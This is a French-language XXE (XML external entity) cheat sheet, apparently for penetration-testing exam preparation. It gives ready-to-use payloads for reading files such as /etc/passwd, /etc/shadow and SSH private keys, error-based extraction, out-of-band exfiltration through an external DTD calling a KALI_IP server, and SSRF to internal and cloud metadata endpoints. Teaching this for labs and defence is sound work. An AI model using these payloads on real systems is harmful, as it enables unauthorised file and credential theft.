# XXE — XML External Entity

## 1. Concept

L'injection XXE force un parseur XML à traiter des **entités externes** pointant vers des fichiers locaux ou des serveurs distants. Résultat : lecture de fichiers sensibles, SSRF, ou dans certains cas RCE.

**Condition :** l'appli doit accepter du XML en entrée (import, upload, API REST/SOAP, endpoint bio/profil...).

---

## 2. Où chercher

```
- Fonctions d'import/export XML
- Upload de fichiers (SVG, DOCX, XLSX contiennent du XML)
- APIs qui consomment du XML (Content-Type: application/xml)
- Champs de profil / bio traités côté serveur
- Formulaires avec des données XML imbriquées
```

Repérer dans Burp :
```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: multipart/form-data (+ fichier XML)
```

---

## 3. Test de vulnérabilité — Entité interne

Avant de tenter l'exfiltration, confirmer que le parseur traite les entités :

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY test "Vulnerable">
]>
<Contact>
  <lastName>&test;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

Si la réponse contient `Vulnerable` à la place de `&test;` → parseur vulnérable ✅

---

## 4. Exploitation In-Band — Lecture de fichier

Le résultat s'affiche directement dans la réponse HTTP.

### 4.1 Payload de base

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&xxe;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

### 4.2 Fichiers cibles

```xml
<!-- Linux -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///root/flag.txt">
<!ENTITY xxe SYSTEM "file:///root/proof.txt">
<!ENTITY xxe SYSTEM "file:///home/USER/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/Users/Administrator/Desktop/proof.txt">
```

### 4.3 Adapter à la structure XML de l'appli

Le contenu doit être injecté dans un **élément** (pas un attribut) :

```xml
<!-- ✅ Fonctionne : élément -->
<longDescription>&xxe;</longDescription>

<!-- ❌ Ne fonctionne pas : attribut -->
<Product description="&xxe;" .../>

<!-- → Restructurer le XML pour passer l'entité dans un élément -->
```

---

## 5. Exploitation Error-Based

Quand le résultat n'est pas visible mais que l'appli renvoie des erreurs détaillées.

**Principe :** injecter dans un champ dont la valeur provoquera une erreur (mauvais type, valeur trop longue...) — l'erreur inclut le contenu du fichier.

```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product
  createdTxStamp="2021-06-04 08:15:48.983"
  productId="TEST-001"
  ...>
  <createdStamp>2021-06-04 08:15:49</createdStamp>
  <description>&xxe;</description>   <!-- ← champ court → erreur truncation -->
  <longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```

**Signal dans l'erreur :**
```
A truncation error was encountered trying to shrink VARCHAR
'root:x:0:0:root:/root:/bin/bash...' to length 255
```

→ Le contenu du fichier apparaît tronqué dans le message d'erreur.

---

## 6. Exploitation Out-of-Band (OOB)

Quand aucun résultat n'est visible et qu'il n'y a pas d'erreurs utiles.

**Principe :** forcer le serveur à faire une requête HTTP vers Kali avec les données en paramètre.

### 6.1 Créer le fichier DTD externe sur Kali

```bash
# /var/www/html/external.dtd
nano /var/www/html/external.dtd
```

```xml
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://KALI_IP/out?%content;'>">
```

```bash
sudo service apache2 start
# ou
python3 -m http.server 80
```

### 6.2 Payload injecté dans l'appli

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://KALI_IP/external.dtd">
%base;
%external;
%exfil;
]>
<root></root>
```

### 6.3 Récupérer les données

```bash
# Observer les logs Apache
sudo tail -f /var/log/apache2/access.log

# Ou dans le terminal python server
# Les données arrivent dans l'URL : /out?root:x:0:0:...
```

!!! warning "Caractères illégaux dans l'URL"
    Les sauts de ligne dans `/etc/passwd` cassent l'URL → erreur "Illegal character in URL".  
    Solution : encoder le contenu en base64 dans le DTD externe (si le parseur le supporte).

---

## 7. XXE → SSRF

Les entités externes peuvent pointer vers des ressources internes :

```xml
<!-- Accéder à un service interne -->
<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">
<!ENTITY xxe SYSTEM "http://192.168.1.10/api/internal">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  <!-- AWS metadata -->
```

```xml
<!-- Payload complet -->
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<data>&xxe;</data>
```

---

## 8. Workflow exam

```
1. Identifier les endpoints qui traitent du XML
   → Import/export, upload, API XML, profil/bio

2. Intercepter la requête dans Burp
   → Observer le Content-Type et la structure XML

3. Tester avec entité interne
   → Confirmer que le parseur est vulnérable

4. Exploitation in-band
   → SYSTEM "file:///etc/passwd" dans un élément

5. Si résultat non visible → error-based
   → Injecter dans un champ court (truncation SQL)

6. Si aucune erreur utile → OOB
   → DTD externe + serveur HTTP sur Kali

7. Lire les fichiers clés
   → /etc/passwd, config.php, credentials, flags
```

!!! tip "Astuce exam"
    Commencer par tester l'entité interne (pas de fichier externe) — si ça marche, le parseur est vulnérable et on peut passer directement à `file://`.  
    Si `file:///etc/passwd` ne marche pas, tenter `file:///etc/hostname` (fichier plus court, moins de risque de troncature).